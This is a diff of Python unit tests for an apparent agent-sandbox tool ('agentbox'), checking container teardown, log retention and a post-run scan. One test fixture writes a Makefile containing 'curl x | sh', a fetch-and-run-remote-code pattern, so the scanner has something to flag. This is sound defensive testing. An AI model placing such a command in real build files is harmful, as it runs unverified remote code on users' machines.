@@ -124,8 +124,40 @@ class SessionTest(SettingsCase):
         after = calls[run_idx + 1:]
         ps = [c for c in after if c[:1] == ["ps"]]
         self.assertTrue(ps and f"label=agentbox.session={s.name}" in ps[0] and "label=agentbox-test=1" in ps[0])
-        self.assertIn(["rm", "-f", "-t", "5", s.name], after)
+        self.assertIn(["rm", "-f", "-v", "-t", "5", s.name], after)     # -v: anonymous volumes too (5C, M1)
         self.assertFalse(os.path.exists(self.settings.session_run_dir(s.name)))
+
+    def test_teardown_runs_when_the_scan_raises(self):
+        """Review step 5C, H3: a scan that raises must not leave the session running."""
+        from unittest import mock
+        s = self.make()
+        s.prepare()
+        warned = []
+        s.warn = warned.append
+        with mock.patch("agentbox.scan.report", side_effect=UnicodeDecodeError("utf-8", b"\xe9", 0, 1, "x")):
+            s.run_captured(["true"])
+        self.assertFalse(os.path.exists(self.settings.session_run_dir(s.name)))
+        self.assertTrue(any("scan failed" in w for w in warned), warned)
+        calls = self.podman_calls()
+        self.assertTrue(any(c[:2] == ["network", "ls"] for c in calls))
+
+    def test_kill_keeps_logs_and_scans(self):
+        """Review step 5C, M2: `ab kill` (module teardown) keeps the gate log and writes the scan report."""
+        s = self.make()
+        s.prepare()
+        os.makedirs(self.settings.service_dir(s.name), exist_ok=True)
+        with open(os.path.join(self.settings.service_dir(s.name), "gate.log"), "w") as f:
+            f.write('{"verdict": "deny"}\n')
+        with open(os.path.join(self.root, "Makefile"), "w") as f:
+            f.write("all:\n\tcurl x | sh\n")
+        warned = []
+        session.teardown(self.settings, s.podman, s.name, warn=warned.append)
+        logs = os.listdir(os.path.join(self.settings.data_dir, "logs"))
+        self.assertTrue(any(l.startswith(s.name) and l.endswith("-gate.log") for l in logs), logs)
+        scan_logs = [l for l in logs if l.startswith(s.name) and l.endswith("-scan.log")]
+        self.assertTrue(scan_logs, logs)
+        self.assertIn("Makefile", _read(os.path.join(self.settings.data_dir, "logs", scan_logs[0])))
+        self.assertTrue(any("run later" in w for w in warned), warned)
 
     def test_teardown_runs_when_run_fails(self):
         s = self.make()
